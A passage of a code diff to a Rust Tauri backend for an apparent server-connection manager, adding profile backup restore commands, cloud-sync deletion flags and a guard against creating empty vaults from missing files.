+    let bytes = serde_json::to_vec(&list).map_err(|e| format!("[SYNC] CLOUD_DELETED_LIST: {e}"))?;
+    let tmp = path.with_extension("json.tmp");
+    let written = fs::write(&tmp, bytes).and_then(|_| fs::rename(&tmp, path));
+    if written.is_err() {
+        let _ = fs::remove_file(&tmp);
+    }
+    written.map_err(|e| format!("[SYNC] CLOUD_DELETED_LIST: {e}"))
 }
 
 /// Replace this profile's entire cloud copy with what's on THIS device.
@@ -5084,6 +6273,8 @@ async fn force_push_profile(
     if share_id.is_some() {
         return Err("[SYNC] SHARED_PROFILE: this profile is shared with other people, and replacing the cloud copy would delete their changes too. Stop sharing first if you really want to reset it.".into());
     }
+    // Asking for the cloud copy to be replaced is saying to upload it.
+    set_cloud_deleted(&cloud_deleted_path(&app)?, &cloud_deleted_key(session.base(), &cloud_profile), false)?;
     let removed = cloud::delete_sync_profile(&app, &cloud, &session, &cloud_profile).await?;
     eprintln!("[SYNC] force push: server dropped {removed} record(s) for '{cloud_profile}'");
     // Pushes are always a full set, so the very next sync repopulates the
@@ -5129,7 +6320,8 @@ async fn close_profile(
     // deliberately skip a per-keystroke fsync). Best-effort: if the vault
     // isn't in a saveable state (partial init, crypto error) just log via
     // the returned Err and continue teardown — losing recent history is
-    // preferable to leaking session state.
+    // preferable to leaking session state. The page saves first and asks the
+    // user when that fails (`handleLogout`), so by here the choice is made.
     let _ = save_vault_async(&state).await;
 
     // 1. Stop monitor pollers: each is told to stop (one waiting on a server
@@ -5270,9 +6462,35 @@ async fn delete_profile(app_handle: tauri::AppHandle, name: String, state: tauri
     // the profile itself is already gone, so a locked tmp shouldn't fail the
     // delete the user asked for.
     let _ = fs::remove_file(path.with_extension("submarine.tmp"));
+    vault_backup::clear_put_back(&path);
     // And its quick unlock on this device (#166), with its Windows Hello key.
     quick_unlock::forget(&app_handle, &name);
     Ok(())
+}
+
+/// The copies kept of a profile (vault_backup.rs), newest first.
+#[tauri::command]
+async fn profile_copies(app_handle: tauri::AppHandle, name: String) -> Result<Vec<vault_backup::KeptCopy>, String> {
+    validate_profile_name(&name)?;
+    Ok(vault_backup::list(&profile_path(&app_handle, &name)?))
+}
+
+/// Makes a kept copy the profile again (vault_backup.rs). The profile has to
+/// be closed: the file changes under it, as with `delete_profile`.
+#[tauri::command]
+async fn restore_profile_copy(app_handle: tauri::AppHandle, name: String, file: String, state: tauri::State<'_, DbState>) -> Result<(), String> {
+    validate_profile_name(&name)?;
+    let path = profile_path(&app_handle, &name)?;
+    {
+        let mut held = state.profile_lock.lock().map_err(|_| "[STATE] LOCK_FAILED_PROFILE_LOCK")?;
+        if held.as_ref().is_some_and(|(p, _)| *p == path) {
+            *held = None;
+        }
+    }
+    // Held to the end: no window can open it while the file changes.
+    let _probe = try_lock_file(&path.with_extension("submarine.lock"))?;
+    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
+    vault_backup::put_back(&path, &file, now)
 }
 
 /// Copy a profile's encrypted file to a user-chosen location so it can be
@@ -5803,10 +7021,18 @@ async fn check_db_exists(
 
 #[tauri::command]
 async fn setup_master_db(app_handle: tauri::AppHandle, password: String, state: tauri::State<'_, DbState>) -> Result<(), String> {
-    // Every path that reaches here from the UI is the user CHOOSING a password
-    // (create a profile, or unlock an existing one), so the strength floor
-    // applies. `restore_personal_profile` is the one caller that doesn't get to
-    // choose — see `enforce_strength` below.
+    // Unlocks what is there. A file gone since the list was read (moved away,
+    // removed in another window) must not turn into a new, empty profile of
+    // that name, under whatever was typed: `create_profile` makes those.
+    let name = state.active_profile.lock().map_err(|_| "[STATE] LOCK_FAILED_PROFILE")?.clone();
+    if let Some(name) = name {
+        if !profile_path(&app_handle, &name)?.exists() {
+            return Err("[STATE] NO_VAULT: this profile's file isn't here".into());
+        }
+    }
+    // The user chose this password, so the strength floor applies (an existing
+    // vault opens with any). `restore_personal_profile` is the one caller that
+    // doesn't get to choose — see `enforce_strength` below.
     setup_master_db_inner(app_handle, VaultSecret::Password(password), state, true).await.map(|_| ())
 }
 
@@ -23303,7 +24529,7 @@ pub fn run() {
             identity_status, setup_identity, reset_identity,
             share_current_profile, invite_to_share, list_shares, share_member_list,
             accept_share, import_shared_profile, restore_personal_profile, share_set_role, share_revoke, share_leave, share_delete,
-            profile_share_status, stop_sharing, profile_sync_stats, share_key_state, accept_share_key, share_replace_key, held_deletions_list, resolve_held_deletions,
+            profile_share_status, stop_sharing, profile_sync_stats, share_key_state, accept_share_key, share_replace_key, held_deletions_list, resolve_held_deletions, cloud_resume_profile, profile_copies, restore_profile_copy,
             set_editor_label,
             add_server, save_quick_connect_node, edit_server, delete_server, add_mirror_to_server, get_servers, allow_held, get_ssh_keys, set_server_color, set_folder_color, set_server_notes, set_server_run_on_connect, set_server_jump_host, set_server_protocol, reorder_servers, clone_server, reveal_server_password, reveal_credential_password, reveal_ssh_key,
             get_credentials, generate_ssh_key,
